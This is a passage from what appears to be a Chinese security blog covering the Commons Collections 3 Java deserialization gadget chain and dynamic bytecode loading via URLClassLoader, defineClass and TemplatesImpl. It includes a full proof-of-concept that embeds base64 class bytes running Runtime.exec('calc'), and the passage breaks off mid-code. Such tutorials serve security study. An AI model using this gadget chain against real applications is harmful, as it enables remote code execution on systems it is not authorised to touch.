，因此CC3真正绕过的是他。</p><p>ysoserial的作者找到了com.sun.org.apache.xalan.internal.xsltc.trax下面的TrAXFilter类，它的构造器非常有意思，调用了newTransformer ，免去了我们手工调用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public TrAXFilter(Templates templates)  throws</span><br><span class="line">    TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    _templates = templates;</span><br><span class="line">    _transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">    _transformerHandler = new TransformerHandlerImpl(_transformer);</span><br><span class="line">    _useServicesMechanism = _transformer.useServicesMechnism();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>正如我第一张图所示  ，当然了，缺少了 InvokerTransformer，TrAXFilter的构造⽅法也是⽆法调⽤的，<br>这里会用到一个新的 Transformer ： org.apache.commons.collections.functors.InstantiateTransformer  他的作⽤就是调⽤构造⽅法</p><p>所以 我们实现的目标就是 利用 InstantiateTransformer 去实例化这个 TrAXFilter，使其去自动调用他的构造方法 ，其构造方法就会自动调用 templates.newTransformer()，里面放入我们的字节码，则可利用成功~  妙！</p><h1 id="POC构造分析"><a href="#POC构造分析" class="headerlink" title="POC构造分析"></a>POC构造分析</h1><p>可能很多小伙伴不知道 POC是怎么样的一个流程，自写POC也比较困难，大部分文章讲的也模棱两可，希望这个构造分析对你有所帮助</p><h2 id="构造字节码"><a href="#构造字节码" class="headerlink" title="构造字节码"></a>构造字节码</h2><p>这个大家应该都知道，就是要利用到恶意字节码，也就是要调用 Templatesimpl.newTransformer 去加载我们的恶意字节码，所以我们先构造所需的字节码 byte：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">byte[] code = Base64.getDecoder().decode(&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJjZUZpbGUBAA1FdmlsVGVzdC5qYXZhDAAOAA8HABwMAB0AHgEABGNhbGMMAB8AIAEACEV2aWxUZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAMAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAAEQALAAAABAABAAwAAQAOAA8AAgAJAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAoAAAAOAAMAAAASAAQAEwANABQACwAAAAQAAQAQAAEAEQAAAAIAEg==&quot;);  </span><br><span class="line">TemplatesImpl templates = new TemplatesImpl();  </span><br><span class="line">setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]&#123;code&#125;);  </span><br><span class="line">setFieldValue(templates,&quot;_name&quot;,&quot;ku1s&quot;);  </span><br><span class="line">setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上篇 我们分析过，将字节码 放入bytecodes 中进行加载，再满足一些参数需求则可以利用 成功</p><p>再此之前，思考个问题， JAVA反序列化是否不同于PHP，JAVA的则是先构造出口，也就是从后往前构造，PHP则相反（ 可能只有我这么认为 哈哈哈</p><h2 id="构造InstantiateTransformer与TrAXFilter"><a href="#构造InstantiateTransformer与TrAXFilter" class="headerlink" title="构造InstantiateTransformer与TrAXFilter"></a>构造InstantiateTransformer与TrAXFilter</h2><p>可以看到第一张图，接下来需要构造 TrAXFilter.class 了，因为此类可以调用到 newTransformer()<br>但又因为 利用点是构造器，需要实例化此类才能调用，则 又关联到了另一个类 InstantiateTransformer.class,该类有 TrAXFilter.class 需要的 newInstance() 方法，所以我们构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] trueTransformers = new Transformer[]&#123;  </span><br><span class="line">    new ConstantTransformer(Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&quot;)),  </span><br><span class="line">    new InstantiateTransformer(  </span><br><span class="line">        new Class[]&#123;Templates.class&#125;,  </span><br><span class="line">        new Object[]&#123;templates&#125;  </span><br><span class="line">    )  </span><br><span class="line">&#125;;  </span><br><span class="line">  </span><br><span class="line">ChainedTransformer chainedTransformer = new ChainedTransformer(trueTransformers);</span><br></pre></td></tr></table></figure><p>Transformer大家都知道，接着 new InstantiateTransformer()传入这里进行了 有参构造：</p><p><img src="/2023/05/16/JAVA-CommonsCollections3/4.jpg"></p><p>接着调用 transform方法</p><p>此时的 con&#x3D;TrAXFilter.class.getConstructor(templates)， 然后这里的IAgs 是我们的字节码~</p><p><img src="/2023/05/16/JAVA-CommonsCollections3/3.jpg"></p><p>紧接着就能 newInstance() -&gt;newTransformer()</p><p>接下来就是拼接 CC1 连接 InstantiateTransformer.class这段了，到了这块，就很简单了，就给Map设置几个基础值就好了。</p><p>这里直接贴了，就不做过多讲解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HashMap innerMap = new HashMap();  </span><br><span class="line">Map outmap = TransformedMap.decorate(innerMap, null, chainedTransformer);  </span><br><span class="line">outmap.put(&quot;test&quot;,&quot;xxx&quot;);</span><br></pre></td></tr></table></figure><p>完整POC:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">public class POC &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">        byte[] code = Base64.getDecoder().decode(&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJjZUZpbGUBAA1FdmlsVGVzdC5qYXZhDAAOAA8HABwMAB0AHgEABGNhbGMMAB8AIAEACEV2aWxUZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAMAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAAEQALAAAABAABAAwAAQAOAA8AAgAJAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAoAAAAOAAMAAAASAAQAEwANABQACwAAAAQAAQAQAAEAEQAAAAIAEg==&quot;);  </span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();  </span><br><span class="line">        setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]&#123;code&#125;);  </span><br><span class="line">        setFieldValue(templates,&quot;_name&quot;,&quot;ku1s&quot;);  </span><br><span class="line">        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        Transformer[] trueTransformers = new Transformer[]&#123;  </span><br><span class="line">            new ConstantTransformer(Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&quot;)),  </span><br><span class="line">            new InstantiateTransformer(  </span><br><span class="line">                new Class[]&#123;Templates.class&#125;,  </span><br><span class="line">                new Object[]&#123;templates&#125;  </span><br><span class="line">            )  </span><br><span class="line">        &#125;;  </span><br><span class="line">  </span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(trueTransformers);  </span><br><span class="line">  </span><br><span class="line">        HashMap innerMap = new HashMap();  </span><br><span class="line">        Map outmap = TransformedMap.decorate(innerMap, null, chainedTransformer);  </span><br><span class="line">        outmap.put(&quot;test&quot;,&quot;xxx&quot;);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功弹出计算器~</p><p><img src="/2023/05/16/JAVA-CommonsCollections3/exc.jpg"></p><p>希望对你有所帮助 ~</p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA动态加载字节码</title>
      <link href="/2023/05/16/JAVA%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/"/>
      <url>/2023/05/16/JAVA%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是JAVA的字节码？"><a href="#什么是JAVA的字节码？" class="headerlink" title="什么是JAVA的字节码？"></a>什么是JAVA的字节码？</h1><p>字节码 其实指的是Java虚拟机运行执行的指令，通过编译后，通常被储存在  .class   文件中。<br>因为语言是跨平台的，其他语言可以通过编译成  .class  文件后，在Java虚拟机中运行~<br>但本文想要说的是字节码 可以将.class 文件 恢复成一个类，在Jvm虚拟机中加载。</p><h1 id="利用URLClassLoader-加载远程文件"><a href="#利用URLClassLoader-加载远程文件" class="headerlink" title="利用URLClassLoader 加载远程文件"></a>利用URLClassLoader 加载远程文件</h1><p>正常情况下 会以 三种情况来寻找  .class 文件 ：</p><ul><li>URL未以斜杠 &#x2F; 结尾，则认为是一个JAR文件，使用 JarLoader 来寻找类，即为在Jar包中寻 找.class文件</li><li>URL以斜杠 &#x2F; 结尾，且协议名是 file ，则使用 FileLoader 来寻找类，即为在本地文件系统中寻 找.class文件</li><li>URL以斜杠 &#x2F; 结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类</li></ul><p>如果是非 file 协议的情况下，最常见使用的协议 则是  http 协议</p><p>接下来测试一下在JAVA中是否能够从远程 HTTP 中加载 .class 文件：</p><p>起一个测试文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">package dynamic;  </span><br><span class="line">  </span><br><span class="line">import java.net.URL;  </span><br><span class="line">import java.net.URLClassLoader;  </span><br><span class="line">public class Test &#123;  </span><br><span class="line">    public static void main( String[] args ) throws Exception &#123;  </span><br><span class="line">        URL[] urls = &#123;new URL(&quot;http://localhost:8000/&quot;)&#125;;  </span><br><span class="line">        URLClassLoader loader = URLClassLoader.newInstance(urls);  </span><br><span class="line">        Class c = loader.loadClass(&quot;Hello&quot;);  </span><br><span class="line">        c.newInstance();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Hello.java:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">package dynamic;  </span><br><span class="line">  </span><br><span class="line">import java.io.IOException;  </span><br><span class="line">  </span><br><span class="line">public class Hello &#123;  </span><br><span class="line">    public Hello() throws IOException &#123;  </span><br><span class="line">  </span><br><span class="line">        System.out.println(&quot;Hello World&quot;);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将 Hello.java 编译成 .class 文件 并在本目录起个 Python 服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server</span><br></pre></td></tr></table></figure><p><img src="/2023/05/16/JAVA%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/1.png" alt="one"></p><p>成功请求到 Hello.class 并执行了其中的字节码 输出Hello World，如果能控制目标 Java ClassLoader的路径作为一个http服务器，则可以利用远程加载的方式执行任意代码。</p><h1 id="利用ClassLoader-define加载远程字节码"><a href="#利用ClassLoader-define加载远程字节码" class="headerlink" title="利用ClassLoader#define加载远程字节码"></a>利用ClassLoader#define加载远程字节码</h1><p>无论是加载远程文件 还是本地的 jar  或 .class  都会经过三个方法的调用。</p><p>通俗的分类：</p><ul><li>loadClass 在本地类缓存中、夫加载器中寻找类，如没有找到，则执行 findClass</li><li>findClass 根据基础 URL指定的方式 来加载类的字节码 然后交给 defineClass</li><li>defineClass 处理前面传入的字节码，将其处理成真正的Java类</li></ul><p>可见核心是 defineClass  他的行为就是将字节码的形式转换成一个Java类。</p><p>在  defineClass   调用时，类对象是不会被初始化的，只有这个对象 显式 的调用 构造函数  初始化代码才会执行，即使是放入static 块中。  ClassLoader 类中的 defineClass  是个  protected  属性，所以如果我们想要使用  defineClass  则需要使用  反射  来调用 ,这个  defineClass   是  TemplateImpl  攻击链的重点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">package dynamic;  </span><br><span class="line">import java.lang.reflect.Method;  </span><br><span class="line">import java.util.Base64;  </span><br><span class="line">public class HelloDefineClass &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">        Method defineClass = ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;, String.class, byte[].class, int.class, int.class);  </span><br><span class="line">        defineClass.setAccessible(true);  </span><br><span class="line">        byte[] code = Base64.getDecoder().decode(&quot;yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM&quot;);  </span><br><span class="line">        Class hello = (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), &quot;Hello&quot;, code, 0, code.length);  </span><br><span class="line">        hello.newInstance();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="利用TemplatesImpl进行加载字节码"><a href="#利用TemplatesImpl进行加载字节码" class="headerlink" title="利用TemplatesImpl进行加载字节码"></a>利用TemplatesImpl进行加载字节码</h1><p>底层链 运用到了 我们的主角  defineClass   ~  </p><p>依赖：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;4.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>本来不想跟链子的，之前也审过没发出来，  但作为本篇的第一篇 还是跟一下吧</p><p>在   TemplatesImpl   的  TransletClassLoader  重载了  defineClass   方法 ，有点长，去头去尾贴出来：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">static final class TransletClassLoader extends ClassLoader &#123;  </span><br><span class="line">    private final Map&lt;String, Class&lt;?&gt;&gt; _loadedExternalExtensionFunctions;  </span><br><span class="line">  </span><br><span class="line">    @Override  </span><br><span class="line">    public Class&lt;?&gt; loadClass(String name) throws ClassNotFoundException &#123;  </span><br><span class="line">        Class&lt;?&gt; ret = null;  </span><br><span class="line">        // The _loadedExternalExtensionFunctions will be empty when the  </span><br><span class="line">        // SecurityManager is not set and the FSP is turned off        if (_loadedExternalExtensionFunctions != null) &#123;  </span><br><span class="line">            ret = _loadedExternalExtensionFunctions.get(name);  </span><br><span class="line">        &#125;  </span><br><span class="line">        if (ret   null) &#123;  </span><br><span class="line">            ret = super.loadClass(name);  </span><br><span class="line">        &#125;  </span><br><span class="line">        return ret;  </span><br><span class="line">     &#125;  </span><br><span class="line">    </span><br><span class="line">     Class&lt;?&gt; defineClass(final byte[] b) &#123;  </span><br><span class="line">        return defineClass(null, b, 0, b.length);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    Class&lt;?&gt; defineClass(final byte[] b, ProtectionDomain pd) &#123;  </span><br><span class="line">        return defineClass(null, b, 0, b.length, pd);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的 defineClass  没有写明类型，默认为default 所以只能被内部调用。</p><p>再跟进谁调用了 此  defineClass(x,y)  在 defineTransletClasses() 中发现 ：</p><p>代码很长 只贴部分<br><img src="/2023/05/16/JAVA%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/2.png" alt="one"></p><p>调用了 两个形参的 defineClass ，再紧接着 跟进谁调用了  defineTransletClasses ，发现是   getTransletInstance </p><p><img src="/2023/05/16/JAVA%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/3.png" alt="one"></p><p>再向上取   newTransformer  调用了  getTransletInstance   而newTransformer 又被getOutputProperties调用 ，至此结束，并且  newTransformer  和  getOutputProperties 是一个public 的类型，可以被外部调用。</p><p><img src="/2023/05/16/JAVA%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/4.png" alt="one"></p><p>调用链为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties() -&gt; </span><br><span class="line">TemplatesImpl#newTransformer() -&gt; </span><br><span class="line">TemplatesImpl#getTransletInstance() -&gt; </span><br><span class="line">TemplatesImpl#defineTransletClasses() -&gt; </span><br><span class="line">TransletClassLoader#defineClass()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>知道了 调用链，就要开始满足 其调用的传参，也就是构成exp 的细节 从调用链的开头来设计参数，从  newTransformer  开始 ：</p><p>调用了   getTransletInstance()  且不需要传参</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public synchronized Transformer newTransformer()  </span><br><span class="line">    throws TransformerConfigurationException  </span><br><span class="line">&#123;  </span><br><span class="line">    TransformerImpl transformer;  </span><br><span class="line">  </span><br><span class="line">    transformer = new TransformerImpl(getTransletInstance(), _outputProperties,  </span><br><span class="line">        _indentNumber, _tfactory);</span><br></pre></td></tr></table></figure><p> getTransletInstance() </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">private Translet getTransletInstance()  </span><br><span class="line">    throws TransformerConfigurationException &#123;  </span><br><span class="line">    try &#123;  </span><br><span class="line">        if (_name   null) return null;  </span><br><span class="line">  </span><br><span class="line">        if (_class   null) defineTransletClasses();</span><br></pre></td></tr></table></figure><p>这里需要满足  name 和 class  不为 null，  才会调用  defineTransletClasses()<br>这里的两个值 都是保护属性，所以我们需要反射 暴力修改其值，不过都是后话<br><img src="/2023/05/16/JAVA%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/5.png" alt="one"></p><p>来到  defineTransletClasses()  看到前面有个判断<br><img src="/2023/05/16/JAVA%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/6.png" alt="one"></p><p>这里的 bytecodes 需要不为null 才能继续往下走，那么我们到这就是要设 3个值了</p><p>此处 的 loader.defineClass(bytecodes[i])  可以看出 bytecodes 就是我们要加载的 字节码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for (int i = 0; i &lt; classCount; i++) &#123;  </span><br><span class="line">    _class[i] = loader.defineClass(_bytecodes[i], pd);  </span><br><span class="line">    final Class&lt;?&gt; superClass = _class[i].getSuperclass();</span><br></pre></td></tr></table></figure><p>但在中间还有个坑  那就是在中间会执行 run() 方法：</p><p><img src="/2023/05/16/JAVA%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/7.png" alt="one"></p><p>调用的是   tfactory.getExternalExtensionsMap()   跟进后，发现getExternalExtensionsMap()是TransformerFactoryImpl类<br><img src="/2023/05/16/JAVA%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/8.png" alt="one"></p><p>构造  tfactory  为  TransformerFactoryImpl  类即可~</p><p>简单的POC：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">package dynamic;  </span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line">import java.lang.reflect.Field;  </span><br><span class="line">import java.util.Base64;  </span><br><span class="line">public class HelloDefineClass &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">            byte[] code =  </span><br><span class="line">                Base64.getDecoder().decode(&quot;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=&quot;);  </span><br><span class="line">            TemplatesImpl obj = new TemplatesImpl();  </span><br><span class="line">            setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][] &#123;code&#125;);  </span><br><span class="line">            setFieldValue(obj, &quot;_name&quot;, &quot;Ku1s-&quot;);  